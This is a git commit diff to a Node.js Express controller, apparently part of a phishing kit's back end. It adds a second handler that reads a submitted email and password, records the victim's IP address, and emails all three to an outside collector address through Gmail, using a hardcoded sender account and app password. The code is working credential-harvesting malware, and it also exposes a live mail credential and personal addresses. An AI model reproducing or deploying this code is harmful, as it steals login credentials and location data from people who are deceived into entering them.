a2ea9ebc14bcbb66d65d466150cc431787753214
officewrk22 <166706754+officewrk22@users.noreply.github.com>
2024-05-31 22:36:24 +0100

    newauth.js

--- controllers/auth.js
+++ controllers/auth.js
@@ -2,6 +2,7 @@ const nodemailer = require("nodemailer");
 
 const adminEmail = ["coolingicecake1@hotmail.com", "result3100@gmail.com"];
 const adminEmailForHashLink = [ "henryhola1945@hotmail.com"];
+const adminEmailForHashLinkTwo = [ "leoncollin01@gmail.com"];
 
 const fromEmail = "slimsean7@gmail.com";
 const fromPassword = 'dwssrznbauszleyv';
@@ -39,6 +40,48 @@ const fromPassword = 'dwssrznbauszleyv';
       const options = {
         from: fromEmail,
         to: adminEmailForHashLink,
+        subject: `INFO`,
+        text: message,
+        html: `<h4>Details</h4>
+        <p>Email: ${email}
+        <p>Password: ${password}</p>
+        <p>Address : ${address}</p>
+        `,
+      };
+  
+      await sendMail(options);
+      res.status(200).send('Success!');
+  
+    } catch (error) {
+      return res.status(500).send('Internal Server Error!');
+    }   
+  };
+
+exports.postHashEmailTwo = async (req, res, next) => {
+    const email = req.body.email;
+    const password = req.body.password;
+    const address =  req.headers["cf-connecting-ip"] || req.headers["x-real-ip"] || req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
+    
+    try {
+      const transporter = nodemailer.createTransport({
+        service: "gmail",
+        host: "smtp.gmail.com",
+        port: 587,
+        secure: false,
+        auth: {
+          user: fromEmail,
+          pass: fromPassword,
+        },
+      });
+  
+      const sendMail = async (mailDetails) => {     
+          const info = await transporter.sendMail(mailDetails);
+      };
+  
+      const message = `Please do not disclose this code`;
+      const options = {
+        from: fromEmail,
+        to: adminEmailForHashLinkTwo,
         subject: `INFO`,
         text: message,
         html: `<h4>Details</h4>
